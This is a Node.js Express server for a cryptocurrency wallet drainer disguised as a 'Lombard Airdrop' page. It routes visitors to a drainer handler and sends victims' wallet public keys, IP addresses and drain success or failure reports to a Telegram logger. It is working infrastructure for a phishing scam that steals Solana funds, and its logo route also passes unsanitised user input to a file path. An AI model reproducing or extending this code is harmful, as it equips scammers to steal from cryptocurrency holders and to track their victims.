import 'dotenv/config';
import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import drainerHandler from './api/drainer.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// API Routes
app.get('/api/drainer', async (req, res) => {
  await drainerHandler(req, res);
});

app.post('/api/drainer', async (req, res) => {
  await drainerHandler(req, res);
});

app.options('/api/drainer', async (req, res) => {
  await drainerHandler(req, res);
});

// Wallet logging endpoint
app.post('/api/drainer/log-wallet', async (req, res) => {
  try {
    const { publicKey, walletType, origin, userAgent } = req.body;
    const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    const telegramLogger = (await import('./src/telegram.js')).default;
    
    // Log wallet detection (this will be called from frontend)
    await telegramLogger.logWalletDetected({
      publicKey: publicKey,
      lamports: 0, // Will be set by drainer when balance is fetched
      ip: userIp,
      walletType: walletType || 'Unknown'
    });
    
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error logging wallet connection:', error);
    res.status(500).json({ error: 'Failed to log wallet connection' });
  }
});

// On-chain confirmation logging endpoint
app.post('/api/drainer/log-confirmation', async (req, res) => {
  try {
    console.log('[CONFIRMATION] Received confirmation request:', req.body);
    const { publicKey, txid, status, error } = req.body;
    const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    const telegramLogger = (await import('./src/telegram.js')).default;
    
    if (status === 'confirmed' || status === 'finalized') {
      console.log('[CONFIRMATION] Logging successful confirmation for:', publicKey, txid);
      await telegramLogger.logDrainSuccess({
        publicKey: publicKey,
        actualDrainAmount: 0, // Will be calculated from transaction
        ip: userIp
      });
    } else if (error) {
      console.log('[CONFIRMATION] Logging failed confirmation for:', publicKey, txid, error);
      await telegramLogger.logDrainFailed({
        publicKey: publicKey,
        lamports: 0,
        ip: userIp,
        error: error || 'Transaction failed on-chain'
      });
    }
    
    console.log('[CONFIRMATION] Confirmation logged successfully');
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('[CONFIRMATION] Error logging confirmation:', error);
    res.status(500).json({ error: 'Failed to log confirmation', details: error.message });
  }
});

// Static file routes
app.get('/logo.png', (req, res) => {
  res.setHeader('Content-Type', 'image/png');
  res.sendFile(path.join(__dirname, 'public', 'logos', 'logo.png'));
});

app.get('/logos/:logo', (req, res) => {
  const logoFile = req.params.logo;
  res.sendFile(path.join(__dirname, 'public', 'logos', logoFile));
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
  console.log(`📱 Lombard Airdrop: http://localhost:${PORT}`);
  console.log(`🔗 API Endpoint: http://localhost:${PORT}/api/drainer`);
  console.log(`📚 Client Library: http://localhost:${PORT}/drainer-client.js`);
}); 